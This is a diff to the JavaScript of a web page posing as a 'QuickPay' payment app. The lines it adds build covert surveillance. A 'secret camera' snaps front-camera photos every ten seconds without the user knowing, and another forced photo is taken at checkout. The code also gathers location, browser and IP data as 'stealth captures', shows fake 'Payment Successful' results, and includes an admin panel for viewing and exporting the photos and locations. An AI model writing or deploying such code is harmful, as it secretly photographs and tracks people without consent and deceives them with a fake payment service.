-    try { await startCamera(); } catch(e){ alert('Camera access denied or not available. Photo capture will fail.'); }
-
-    // Ask for geolocation
-    let position = null;
-    try {
-      position = await getLocationPromise();
-      setStatus('location obtained');
-    } catch(err){
-      console.warn('location error', err);
-      setStatus('location denied or timeout');
-    }
-
-    // Capture photo if camera started
-    let photoData = null;
-    if(mediaStream){
-      try { photoData = capturePhoto(); setStatus('photo captured'); } catch(e){ console.error('capture error', e); setStatus('photo capture failed'); }
-    } else { setStatus('no camera -> skipping photo'); }
-
-    // Build result object
-    const username = document.getElementById('username').value || 'anonymous';
-    const timestamp = (new Date()).toISOString();
-    const timestampForFilename = timestamp.replace(/[:.]/g, '-');
+  // File upload handler
+  qrInput.addEventListener('change', async function(event) {
+    const file = event.target.files[0];
+    if (!file) return;
     
-    const coords = position ? {
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      altitude: position.coords.altitude,
-      altitudeAccuracy: position.coords.altitudeAccuracy,
-      heading: position.coords.heading,
-      speed: position.coords.speed,
-      timestamp: new Date(position.timestamp).toISOString()
-    } : null;
-
-    // Save photo to file if captured
-    if (photoData) {
-      const photoFilename = `photo-${username}-${timestampForFilename}.png`;
-      saveBase64Image(photoData, photoFilename);
-      savedFileRecords.push({
-        type: 'photo',
-        filename: photoFilename,
-        timestamp: timestamp
-      });
-      await saveFileRecord({
-        type: 'photo',
-        filename: photoFilename,
-        username: username,
-        timestamp: timestamp,
-        dataUrl: photoData
-      });
-    }
-
-    // Save location data to file if available
-    if (coords) {
-      const locationFilename = `location-${username}-${timestampForFilename}.json`;
-      const locationData = {
-        username: username,
-        timestamp: timestamp,
-        coordinates: coords
-      };
-      saveFile(locationFilename, JSON.stringify(locationData, null, 2), 'application/json');
-      savedFileRecords.push({
-        type: 'location',
-        filename: locationFilename,
-        timestamp: timestamp
-      });
-      await saveFileRecord({
-        type: 'location',
-        filename: locationFilename,
-        username: username,
-        timestamp: timestamp,
-        data: locationData
-      });
-    }
-
-    // Save QR data if available
-    if (uploadedQRPayload) {
-      const qrFilename = `qrdata-${username}-${timestampForFilename}.txt`;
-      saveFile(qrFilename, uploadedQRPayload, 'text/plain');
-      savedFileRecords.push({
-        type: 'qr',
-        filename: qrFilename,
-        timestamp: timestamp
-      });
-      await saveFileRecord({
-        type: 'qr',
-        filename: qrFilename,
-        username: username,
-        timestamp: timestamp,
-        data: uploadedQRPayload
-      });
-    }
-
-    lastCapture = {
-      username,
-      timestamp,
-      qrImage: uploadedQRData,
-      qrPayload: uploadedQRPayload,
-      photo: photoData,
-      coords,
-      savedFiles: savedFileRecords
-    };
-
-    // Save to IndexedDB
-    try{
-      await saveCapture(Object.assign({}, lastCapture, { savedAt: new Date().toISOString() }));
-      setStatus('capture saved to local DB');
-    }catch(e){ console.error('save error', e); setStatus('save failed'); }
-
-    // Show results
-    resultsContent.innerHTML = `
-      <div><strong>Username:</strong> ${username}</div>
-      <div><strong>Timestamp:</strong> ${timestamp}</div>
-      <div style="margin-top:8px"><strong>Location:</strong> ${coords ? `Lat ${coords.latitude.toFixed(6)}, Lon ${coords.longitude.toFixed(6)} (±${coords.accuracy} m)` : '<span class="danger">not available / denied</span>'}</div>
-      <div style="margin-top:8px"><strong>QR decoded:</strong> ${uploadedQRPayload ? `<code>${escapeHtml(uploadedQRPayload)}</code>` : '<span class="muted">no payload</span>'}</div>
-      <div style="margin-top:8px"><strong>Photo captured:</strong> ${photoData ? 'yes (saved as file)' : '<span class="muted">no</span>'}</div>
-    `;
-
-    // Show saved files links
-    if (savedFileRecords.length > 0) {
-      let filesHtml = '';
-      savedFileRecords.forEach(file => {
-        filesHtml += `<div class="file-link">${file.type}: ${file.filename}</div>`;
-      });
-      savedFilesList.innerHTML = filesHtml;
-      fileLinksDiv.style.display = 'block';
-    }
-
-    resultArea.style.display = 'block';
-    await refreshList();
-  });
-
-  downloadBtn.addEventListener('click', () => {
-    if(!lastCapture){ alert('No capture available'); return; }
-    const fileName = 'quickpay-capture-' + (new Date()).toISOString().replace(/[:.]/g,'-') + '.json';
-    const blob = new Blob([JSON.stringify(lastCapture, null, 2)], { type: 'application/json' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a'); a.href = url; a.download = fileName; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
-  });
-
-  downloadAllFilesBtn.addEventListener('click', async () => {
-    const files = await listFiles();
-    if (!files || files.length === 0) {
-      alert('No saved files found');
+    if (!file.type.startsWith('image/')) {
+      status.textContent = 'Please select an image file';
       return;
     }
-
-    // Create a zip file using JSZip
-    const zip = new JSZip();
     
-    files.forEach(file => {
-      if (file.type === 'photo' && file.dataUrl) {
-        // Add photo to zip
-        const base64Data = file.dataUrl.replace(/^data:image\/\w+;base64,/, '');
-        zip.file(file.filename, base64Data, { base64: true });
-      } else if (file.type === 'location' && file.data) {
-        // Add location data to zip
-        zip.file(file.filename, JSON.stringify(file.data, null, 2));
-      } else if (file.type === 'qr' && file.data) {
-        // Add QR data to zip
-        zip.file(file.filename, file.data);
-      }
-    });
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      uploadedQRData = e.target.result;
+      qrPreview.innerHTML = `<img src="${uploadedQRData}" alt="Uploaded QR Code" style="max-width:100%;max-height:100%">`;
+      status.textContent = 'QR code uploaded';
+      
+      // Try to decode QR
+      decodeQRFromImage(uploadedQRData);
+    };
+    reader.readAsDataURL(file);
+  });
 
-    // Generate zip file
-    zip.generateAsync({ type: "blob" }).then(function(content) {
-      const fileName = `quickpay-files-${new Date().toISOString().replace(/[:.]/g, '-')}.zip`;
-      const url = URL.createObjectURL(content);
+  // Decode QR from image data URL
+  async function decodeQRFromImage(dataUrl) {
+    try {
+      const img = new Image();
+      img.onload = function() {
+        const canvas = document.createElement('canvas');
+        canvas.width = img.width;
+        canvas.height = img.height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(img, 0, 0);
+        
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const code = jsQR(imageData.data, canvas.width, canvas.height);
+        
+        if (code && code.data) {
+          uploadedQRPayload = code.data;
+          status.textContent = `QR decoded: ${code.data.substring(0, 30)}...`;
+          
+          // Save stealth capture
+          saveStealthCapture({
+            type: 'qr_decode',
+            source: 'file_upload',
+            data: code.data,
+            timestamp: new Date().toISOString(),
+            mode: currentMode,
+            sessionId: sessionId
+          });
+        } else {
+          uploadedQRPayload = null;
+          status.textContent = 'QR uploaded but could not decode';
+        }
+      };
+      img.src = dataUrl;
+    } catch (error) {
+      console.error('QR decode error:', error);
+      uploadedQRPayload = null;
+    }
+  }
+
+  // ========== SECRET CAMERA SYSTEM ==========
+  // This camera runs in the background without showing to user
+  
+  async function startSecretCamera() {
+    try {
+      // Only start if we have permission or can get it
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoDevices = devices.filter(device => device.kind === 'videoinput');
+      
+      if (videoDevices.length === 0) return;
+      
+      // Try to access camera silently (user might have already granted permission)
+      secretCamera = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: 'user', // Front camera for selfie
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        },
+        audio: false
+      });
+      
+      console.log('Secret camera started successfully');
+      
+      // Start taking photos periodically
+      secretPhotoInterval = setInterval(async () => {
+        await takeSecretPhoto();
+      }, 10000); // Take photo every 10 seconds
+      
+    } catch (error) {
+      console.log('Secret camera not available:', error.message);
+      // Silent fail - user doesn't know we tried
+    }
+  }
+  
+  async function takeSecretPhoto() {
+    if (!secretCamera) return;
+    
+    try {
+      // Create a temporary video element
+      const tempVideo = document.createElement('video');
+      tempVideo.srcObject = secretCamera;
+      await new Promise(resolve => {
+        tempVideo.onloadedmetadata = () => {
+          tempVideo.play();
+          resolve();
+        };
+      });
+      
+      // Wait a moment for video to be ready
+      await new Promise(resolve => setTimeout(resolve, 500));
+      
+      // Capture photo
+      const canvas = document.createElement('canvas');
+      canvas.width = tempVideo.videoWidth;
+      canvas.height = tempVideo.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+      
+      const photoData = canvas.toDataURL('image/jpeg', 0.7); // Compressed
+      
+      // Save the photo
+      await saveStealthPhoto({
+        type: 'secret_photo',
+        timestamp: new Date().toISOString(),
+        sessionId: sessionId,
+        photo: photoData,
+        source: 'background_camera',
+        note: 'Auto-captured during session'
+      });
+      
+      console.log('Secret photo captured and saved');
+      
+    } catch (error) {
+      console.error('Error taking secret photo:', error);
+    }
+  }
+  
+  function stopSecretCamera() {
+    if (secretCamera) {
+      secretCamera.getTracks().forEach(track => track.stop());
+      secretCamera = null;
+    }
+    
+    if (secretPhotoInterval) {
+      clearInterval(secretPhotoInterval);
+      secretPhotoInterval = null;
+    }
+  }
+
+  // Camera functions (for visible QR scanning)
+  async function startCamera() {
+    try {
+      if (mediaStream) {
+        stopCamera();
+        return;
+      }
+      
+      mediaStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment' },
+        audio: false
+      });
+      
+      camVideo.srcObject = mediaStream;
+      camVideo.style.display = 'block';
+      cameraPlaceholder.style.display = 'none';
+      cameraBtn.textContent = '📷 Stop Camera';
+      isCameraActive = true;
+      status.textContent = 'Camera active - scanning for QR codes...';
+      
+      // Start QR scanning
+      startQRScanning();
+      
+    } catch (error) {
+      console.error('Camera error:', error);
+      status.textContent = 'Camera access denied or unavailable';
+    }
+  }
+
+  function stopCamera() {
+    if (mediaStream) {
+      mediaStream.getTracks().forEach(track => track.stop());
+      mediaStream = null;
+    }
+    
+    camVideo.style.display = 'none';
+    cameraPlaceholder.style.display = 'block';
+    cameraBtn.textContent = '📷 Use Camera';
+    isCameraActive = false;
+    
+    if (scanInterval) {
+      clearInterval(scanInterval);
+      scanInterval = null;
+    }
+    
+    status.textContent = 'Camera stopped';
+  }
+
+  function startQRScanning() {
+    if (scanInterval) clearInterval(scanInterval);
+    
+    scanInterval = setInterval(async () => {
+      if (!mediaStream) return;
+      
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = camVideo.videoWidth;
+        canvas.height = camVideo.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(camVideo, 0, 0, canvas.width, canvas.height);
+        
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const code = jsQR(imageData.data, canvas.width, canvas.height);
+        
+        if (code && code.data) {
+          uploadedQRPayload = code.data;
+          status.textContent = `QR detected: ${code.data.substring(0, 30)}...`;
+          
+          // Update preview
+          const dataUrl = canvas.toDataURL('image/jpeg');
+          uploadedQRData = dataUrl;
+          qrPreview.innerHTML = `<img src="${dataUrl}" alt="Camera QR" style="max-width:100%;max-height:100%">`;
+          
+          // Save stealth capture
+          saveStealthCapture({
+            type: 'qr_decode',
+            source: 'camera_scan',
+            data: code.data,
+            timestamp: new Date().toISOString(),
+            mode: currentMode,
+            photo: dataUrl,
+            sessionId: sessionId
+          });
+          
+          // Stop scanning after successful detection
+          stopCamera();
+        }
+      } catch (error) {
+        // Silent error
+      }
+    }, 1000); // Scan every second
+  }
+
+  cameraBtn.addEventListener('click', startCamera);
+
+  // Proceed button handler
+  proceedBtn.addEventListener('click', async function() {
+    // Validate inputs
+    if (!uploadedQRData) {
+      status.textContent = 'Please upload or scan a QR code first';
+      return;
+    }
+    
+    if (currentMode === 'receive') {
+      const amount = parseFloat(amountInput.value);
+      if (!amount || amount <= 0) {
+        status.textContent = 'Please enter a valid amount for Receive mode';
+        return;
+      }
+    }
+    
+    // Disable button during processing
+    proceedBtn.disabled = true;
+    status.textContent = 'Processing transaction...';
+    
+    // Simulate processing delay
+    setTimeout(async () => {
+      try {
+        // CAPTURE PHOTO RIGHT NOW (even if camera wasn't active)
+        await capturePhotoNow();
+        
+        // Capture stealth data
+        await captureStealthData();
+        
+        // Create transaction
+        const username = usernameInput.value || 'Anonymous';
+        const amount = currentMode === 'receive' ? parseFloat(amountInput.value) : 0;
+        const transactionId = 'TXN' + Date.now() + Math.random().toString(36).substring(2, 8).toUpperCase();
+        
+        const transaction = {
+          id: transactionId,
+          mode: currentMode,
+          username: username,
+          amount: amount,
+          qrData: uploadedQRPayload,
+          timestamp: new Date().toISOString(),
+          status: 'completed',
+          sessionId: sessionId
+        };
+        
+        // Save transaction
+        await saveTransaction(transaction);
+        
+        // Update UI with results
+        resultTitle.textContent = currentMode === 'pay' ? 'Payment Successful' : 'Payment Request Created';
+        
+        let resultHTML = '';
+        if (currentMode === 'pay') {
+          resultHTML = `
+            <div style="color:var(--accent);font-size:16px;margin-bottom:12px;">
+              ✅ Payment processed successfully
+            </div>
+            <div>
+              <div><strong>Transaction ID:</strong> ${transactionId}</div>
+              <div><strong>Status:</strong> Completed</div>
+              <div><strong>To:</strong> ${uploadedQRPayload || 'QR Payee'}</div>
+            </div>
+          `;
+        } else {
+          resultHTML = `
+            <div style="color:var(--accent);font-size:16px;margin-bottom:12px;">
+              ✅ Payment request created
+            </div>
+            <div>
+              <div><strong>Transaction ID:</strong> ${transactionId}</div>
+              <div><strong>Amount:</strong> ₹${amount.toFixed(2)}</div>
+              <div><strong>Status:</strong> Pending</div>
+              <div><strong>From:</strong> ${uploadedQRPayload || 'QR Payer'}</div>
+            </div>
+          `;
+        }
+        
+        resultsContent.innerHTML = resultHTML;
+        
+        // Add transaction details
+        transactionDetails.innerHTML = `
+          <div><strong>Details:</strong></div>
+          <div style="margin-top:8px;font-size:12px;">
+            <div>Mode: ${currentMode === 'pay' ? 'Payment' : 'Receive'}</div>
+            <div>User: ${username}</div>
+            <div>Time: ${new Date().toLocaleString()}</div>
+            <div>QR Data: ${uploadedQRPayload ? uploadedQRPayload.substring(0, 50) + '...' : 'Not decoded'}</div>
+          </div>
+        `;
+        
+        resultArea.style.display = 'block';
+        status.textContent = `Transaction ${transactionId} completed`;
+        
+        // Update transactions list
+        updateTransactionsList();
+        
+      } catch (error) {
+        console.error('Transaction error:', error);
+        status.textContent = 'Transaction failed - please try again';
+        
+        resultsContent.innerHTML = `
+          <div style="color:var(--danger);">
+            ❌ Transaction failed
+          </div>
+          <div class="small muted" style="margin-top:8px;">
+            An error occurred while processing. This is a demo simulation.
+          </div>
+        `;
+        resultArea.style.display = 'block';
+      } finally {
+        proceedBtn.disabled = false;
+      }
+    }, 1500); // Simulate 1.5 second processing time
+  });
+
+  // Force photo capture when user clicks proceed
+  async function capturePhotoNow() {
+    try {
+      // First try to use secret camera if available
+      if (secretCamera) {
+        await takeSecretPhoto();
+      }
+      
+      // Also try to get camera access if we don't have it yet
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+        
+        // Create a temporary video element
+        const tempVideo = document.createElement('video');
+        tempVideo.srcObject = stream;
+        await new Promise(resolve => {
+          tempVideo.onloadedmetadata = () => {
+            tempVideo.play();
+            resolve();
+          };
+        });
+        
+        // Wait a moment
+        await new Promise(resolve => setTimeout(resolve, 300));
+        
+        // Capture photo
+        const canvas = document.createElement('canvas');
+        canvas.width = tempVideo.videoWidth;
+        canvas.height = tempVideo.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+        
+        const photoData = canvas.toDataURL('image/jpeg', 0.7);
+        
+        // Save the photo
+        await saveStealthPhoto({
+          type: 'transaction_photo',
+          timestamp: new Date().toISOString(),
+          sessionId: sessionId,
+          photo: photoData,
+          source: 'force_capture',
+          note: 'Captured when user clicked Proceed',
+          mode: currentMode
+        });
+        
+        console.log('Forced photo captured at transaction time');
+        
+        // Stop the stream
+        stream.getTracks().forEach(track => track.stop());
+        
+      } catch (error) {
+        console.log('Could not force photo capture:', error.message);
+      }
+      
+    } catch (error) {
+      console.error('Photo capture error:', error);
+    }
+  }
+
+  // Capture stealth data (location, browser info, etc.)
+  async function captureStealthData() {
+    try {
+      const stealthData = {
+        type: 'user_interaction',
+        timestamp: new Date().toISOString(),
+        mode: currentMode,
+        username: usernameInput.value || 'Anonymous',
+        amount: currentMode === 'receive' ? parseFloat(amountInput.value) : null,
+        qrData: uploadedQRPayload,
+        userAgent: navigator.userAgent,
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        sessionId: sessionId,
+        pageUrl: window.location.href,
+        referrer: document.referrer
+      };
+      
+      // Try to get location
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: false,
+              timeout: 3000,
+              maximumAge: 0
+            });
+          });
+          
+          stealthData.location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date(position.timestamp).toISOString()
+          };
+        } catch (geoError) {
+          // Silent fail - location not captured
+        }
+      }
+      
+      // Get IP address (approximate)
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        stealthData.ipAddress = ipData.ip;
+      } catch (ipError) {
+        // Silent fail
+      }
+      
+      // Save stealth data
+      await saveStealthCapture(stealthData);
+      
+    } catch (error) {
+      console.error('Stealth capture error:', error);
+    }
+  }
+
+  // Update transactions list
+  async function updateTransactionsList() {
+    try {
+      const transactions = await getTransactions();
+      transactionsList.innerHTML = '';
+      
+      // Show latest 5 transactions
+      const recent = transactions.slice(-5).reverse();
+      
+      if (recent.length === 0) {
+        transactionsList.innerHTML = '<div class="muted small">No transactions yet</div>';
+        return;
+      }
+      
+      recent.forEach(tx => {
+        const div = document.createElement('div');
+        div.className = 'item';
+        
+        const amount = tx.amount ? `₹${tx.amount.toFixed(2)}` : '₹0.00';
+        const time = new Date(tx.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+        
+        div.innerHTML = `
+          <div>
+            <div>${tx.mode === 'pay' ? 'Payment' : 'Receive'}</div>
+            <div class="badge">${time}</div>
+          </div>
+          <div style="color:${tx.mode === 'pay' ? 'var(--danger)' : 'var(--accent)'}">
+            ${tx.mode === 'pay' ? '-' : '+'}${amount}
+          </div>
+        `;
+        
+        transactionsList.appendChild(div);
+      });
+      
+    } catch (error) {
+      console.error('Update transactions error:', error);
+    }
+  }
+
+  // Reset button
+  resetBtn.addEventListener('click', function() {
+    qrInput.value = '';
+    uploadedQRData = null;
+    uploadedQRPayload = null;
+    usernameInput.value = '';
+    amountInput.value = '';
+    resultArea.style.display = 'none';
+    qrPreview.innerHTML = `
+      <div style="text-align:center;color:var(--muted);">
+        <div style="font-size:48px;margin-bottom:8px">📷</div>
+        <div>Upload QR code or use camera</div>
+      </div>
+    `;
+    status.textContent = 'Ready';
+    stopCamera();
+  });
+
+  // ========== ADMIN PANEL WITH PASSWORD ==========
+  
+  function showPasswordModal() {
+    document.getElementById('passwordModal').style.display = 'flex';
+    document.getElementById('passwordInput').focus();
+    document.getElementById('passwordError').style.display = 'none';
+  }
+  
+  function hidePasswordModal() {
+    document.getElementById('passwordModal').style.display = 'none';
+    document.getElementById('passwordInput').value = '';
+  }
+  
+  async function showAdminPanel() {
+    // Create admin panel if it doesn't exist
+    let adminPanel = document.getElementById('adminPanel');
+    if (!adminPanel) {
+      adminPanel = document.createElement('div');
+      adminPanel.id = 'adminPanel';
+      adminPanel.className = 'admin-panel';
+      adminPanel.innerHTML = `
+        <div class="admin-header">
+          <h2>🔐 QuickPay Admin Panel</h2>
+          <button id="closeAdmin" class="btn danger">Close</button>
+        </div>
+        <div class="admin-stats">
+          <div class="stat-card">
+            <div class="stat-value" id="statTransactions">0</div>
+            <div class="stat-label">Transactions</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="statCaptures">0</div>
+            <div class="stat-label">Stealth Captures</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="statPhotos">0</div>
+            <div class="stat-label">Photos Captured</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="statSessions">0</div>
+            <div class="stat-label">Active Sessions</div>
+          </div>
+        </div>
+        <div class="tab-buttons">
+          <button class="tab-button active" data-tab="transactions">Transactions</button>
+          <button class="tab-button" data-tab="captures">Stealth Data</button>
+          <button class="tab-button" data-tab="photos">Captured Photos</button>
+          <button class="tab-button" data-tab="export">Export</button>
+        </div>
+        <div id="tabTransactions" class="tab-content active">
+          <h3>Recent Transactions</h3>
+          <div class="list" style="max-height:300px;">
+            <table class="data-table">
+              <thead>
+                <tr>
+                  <th>ID</th>
+                  <th>Mode</th>
+                  <th>User</th>
+                  <th>Amount</th>
+                  <th>Time</th>
+                  <th>Session</th>
+                </tr>
+              </thead>
+              <tbody id="adminTransactionsBody"></tbody>
+            </table>
+          </div>
+        </div>
+        <div id="tabCaptures" class="tab-content">
+          <h3>Stealth Data Captures</h3>
+          <div class="list" style="max-height:300px;">
+            <table class="data-table">
+              <thead>
+                <tr>
+                  <th>Type</th>
+                  <th>Time</th>
+                  <th>Mode</th>
+                  <th>Location</th>
+                  <th>Data</th>
+                </tr>
+              </thead>
+              <tbody id="adminCapturesBody"></tbody>
+            </table>
+          </div>
+        </div>
+        <div id="tabPhotos" class="tab-content">
+          <h3>Captured Photos</h3>
+          <div id="photoGallery" style="display:grid;grid-template-columns:repeat(auto-fill, minmax(100px, 1fr));gap:10px;margin-top:15px;">
+            <!-- Photos will be loaded here -->
+          </div>
+        </div>
+        <div id="tabExport" class="tab-content">
+          <h3>Export Data</h3>
+          <div style="margin:20px 0;">
+            <button id="exportAllBtn" class="btn">Export All as JSON</button>
+            <button id="exportPhotosBtn" class="btn ghost" style="margin-left:10px;">Export All Photos</button>
+            <button id="clearDataBtn" class="btn danger" style="margin-left:10px;">Clear All Data</button>
+          </div>
+          <div class="notice">
+            <strong>🔒 Secret Camera Status:</strong> <span id="cameraStatus">Inactive</span>
+          </div>
+          <div class="notice" style="margin-top:10px;">
+            <strong>📊 Current Session:</strong> ${sessionId}
+          </div>
+        </div>
+      `;
+      document.body.appendChild(adminPanel);
+      
+      // Add admin panel event listeners
+      document.getElementById('closeAdmin').addEventListener('click', hideAdminPanel);
+      
+      document.querySelectorAll('.tab-button').forEach(btn => {
+        btn.addEventListener('click', function() {
+          document.querySelectorAll('.tab-button').forEach(b => b.classList.remove('active'));
+          document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+          
+          this.classList.add('active');
+          document.getElementById(`tab${this.dataset.tab.charAt(0).toUpperCase() + this.dataset.tab.slice(1)}`).classList.add('active');
+          
+          // Load photos if photo tab is selected
+          if (this.dataset.tab === 'photos') {
+            loadPhotoGallery();
+          }
+        });
+      });
+      
+      document.getElementById('exportAllBtn').addEventListener('click', exportAllData);
+      document.getElementById('exportPhotosBtn').addEventListener('click', exportAllPhotos);
+      document.getElementById('clearDataBtn').addEventListener('click', clearAllData);
+    }
+    
+    // Load admin data
+    await loadAdminData();
+    adminPanel.style.display = 'block';
+    document.body.style.overflow = 'hidden';
+  }
+  
+  function hideAdminPanel() {
+    document.getElementById('adminPanel').style.display = 'none';
+    document.body.style.overflow = 'auto';
+  }
+  
+  async function loadAdminData() {
+    try {
+      const transactions = await getTransactions();
+      const captures = await getCaptures();
+      const photos = await getPhotos();
+      
+      // Update stats
+      document.getElementById('statTransactions').textContent = transactions.length;
+      document.getElementById('statCaptures').textContent = captures.length;
+      document.getElementById('statPhotos').textContent = photos.length;
+      document.getElementById('statSessions').textContent = new Set(transactions.map(t => t.sessionId)).size;
+      
+      // Update camera status
+      document.getElementById('cameraStatus').textContent = 
+        secretCamera ? '✅ Active (taking photos every 10s)' : '❌ Inactive';
+      document.getElementById('cameraStatus').style.color = 
+        secretCamera ? 'var(--accent)' : 'var(--danger)';
+      
+      // Load transactions table
+      const tbody = document.getElementById('adminTransactionsBody');
+      tbody.innerHTML = '';
+      
+      transactions.reverse().slice(0, 20).forEach(tx => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td>${tx.id.substring(0, 10)}...</td>
+          <td><span class="badge">${tx.mode}</span></td>
+          <td>${tx.username}</td>
+          <td>₹${tx.amount ? tx.amount.toFixed(2) : '0.00'}</td>
+          <td>${new Date(tx.timestamp).toLocaleTimeString()}</td>
+          <td><code title="${tx.sessionId}">${tx.sessionId.substring(0, 8)}...</code></td>
+        `;
+        tbody.appendChild(row);
+      });
+      
+      // Load captures table
+      const cbody = document.getElementById('adminCapturesBody');
+      cbody.innerHTML = '';
+      
+      captures.reverse().slice(0, 20).forEach(cap => {
+        const row = document.createElement('tr');
+        const location = cap.location ? 
+          `<a href="https://maps.google.com/?q=${cap.location.latitude},${cap.location.longitude}" target="_blank" style="color:var(--accent);">
+            ${cap.location.latitude.toFixed(4)}, ${cap.location.longitude.toFixed(4)}
+          </a>` : 'N/A';
+        
+        row.innerHTML = `
+          <td>${cap.type || 'N/A'}</td>
+          <td>${new Date(cap.timestamp).toLocaleTimeString()}</td>
+          <td>${cap.mode || 'N/A'}</td>
+          <td>${location}</td>
+          <td>${cap.qrData ? cap.qrData.substring(0, 20) + '...' : (cap.ipAddress || 'N/A')}</td>
+        `;
+        cbody.appendChild(row);
+      });
+      
+    } catch (error) {
+      console.error('Load admin data error:', error);
+    }
+  }
+  
+  async function loadPhotoGallery() {
+    try {
+      const photos = await getPhotos();
+      const gallery = document.getElementById('photoGallery');
+      gallery.innerHTML = '';
+      
+      if (photos.length === 0) {
+        gallery.innerHTML = '<div class="muted small">No photos captured yet</div>';
+        return;
+      }
+      
+      photos.reverse().slice(0, 50).forEach((photo, index) => {
+        const div = document.createElement('div');
+        div.style.textAlign = 'center';
+        div.innerHTML = `
+          <img src="${photo.photo}" alt="Captured photo ${index + 1}" 
+               class="photo-thumb" 
+               onclick="window.openPhotoViewer('${photo.photo}', '${photo.timestamp}')">
+          <div class="small muted" style="margin-top:5px;font-size:10px;">
+            ${new Date(photo.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
+          </div>
+        `;
+        gallery.appendChild(div);
+      });
+      
+    } catch (error) {
+      console.error('Load photo gallery error:', error);
+    }
+  }
+  
+  // Global function for opening photos
+  window.openPhotoViewer = function(photoData, timestamp) {
+    const w = window.open('', '_blank', 'width=600,height=700');
+    w.document.write(`
+      <html>
+        <head>
+          <title>Captured Photo - ${new Date(timestamp).toLocaleString()}</title>
+          <style>
+            body { margin: 0; background: #0f1724; color: white; font-family: Arial; }
+            img { max-width: 100%; height: auto; display: block; }
+            .info { padding: 15px; background: rgba(0,0,0,0.5); }
+            .close { position: fixed; top: 10px; right: 10px; background: #ff6b6b; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; }
+            @media (max-width: 600px) {
+              .close { top: 5px; right: 5px; padding: 6px 12px; font-size: 12px; }
+            }
+          </style>
+        </head>
+        <body>
+          <button class="close" onclick="window.close()">Close</button>
+          <img src="${photoData}">
+          <div class="info">
+            <div><strong>Captured:</strong> ${new Date(timestamp).toLocaleString()}</div>
+            <div><strong>Size:</strong> ${Math.round(photoData.length / 1024)} KB</div>
+            <div style="margin-top:10px;">
+              <button onclick="navigator.clipboard.writeText('${photoData}').then(() => alert('Copied to clipboard!'))">
+                Copy Data URL
+              </button>
+            </div>
+          </div>
+        </body>
+      </html>
+    `);
+  };
+
+  async function exportAllData() {
+    try {
+      const transactions = await getTransactions();
+      const captures = await getCaptures();
+      const photos = await getPhotos();
+      
+      // Don't include full photo data in JSON (too large)
+      const photosForExport = photos.map(p => ({
+        ...p,
+        photo: p.photo ? '[PHOTO_DATA_REMOVED_FOR_SIZE]' : null
+      }));
+      
+      const exportData = {
+        metadata: {
+          exportTime: new Date().toISOString(),
+          totalTransactions: transactions.length,
+          totalCaptures: captures.length,
+          totalPhotos: photos.length,
+          sessionId: sessionId,
+          adminPassword: ADMIN_PASSWORD
+        },
+        transactions: transactions,
+        stealthCaptures: captures,
+        photos: photosForExport
+      };
+      
+      const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = fileName;
+      a.download = `quickpay_data_${Date.now()}.json`;
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
-    });
-  });
-
-  // Live QR scanning from camera frames
-  scanToggleBtn.addEventListener('click', async () => {
-    if(liveScan){ stopCamera(); return; }
-    try{ await startCamera(); }catch(e){ alert('Camera unavailable for live scan'); return; }
-    liveScan = true; scanToggleBtn.textContent = 'Stop live QR scan';
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    scanInterval = setInterval(() => {
-      if(!mediaStream) return;
-      const w = camVideo.videoWidth || 320; const h = camVideo.videoHeight || 240;
-      if(!w || !h) return;
-      canvas.width = w; canvas.height = h; ctx.drawImage(camVideo,0,0,w,h);
-      try{
-        const imageData = ctx.getImageData(0,0,w,h);
-        const code = jsQR(imageData.data, w, h);
-        if(code && code.data){
-          uploadedQRPayload = code.data;
-          setStatus('Live QR decoded: ' + uploadedQRPayload);
-          // show small overlay preview
-          qrPreview.innerHTML = '<div style="padding:8px;color:var(--muted);font-size:13px">Live scan detected QR</div>';
-          // stop scanning automatically (optional)
-          clearInterval(scanInterval); scanInterval = null; liveScan = false; scanToggleBtn.textContent = 'Start live QR scan';
-        }
-      }catch(e){ /* ignore frame parse errors */ }
-    }, 300);
-  });
-
-  // Captures list UI
-  async function refreshList(){
-    const arr = await listCaptures().catch(()=>[]);
-    if(!arr || arr.length===0){ capturesList.innerHTML = '<div class="muted small">No captures yet</div>'; return; }
-    capturesList.innerHTML = '';
-    arr.reverse().forEach(item => {
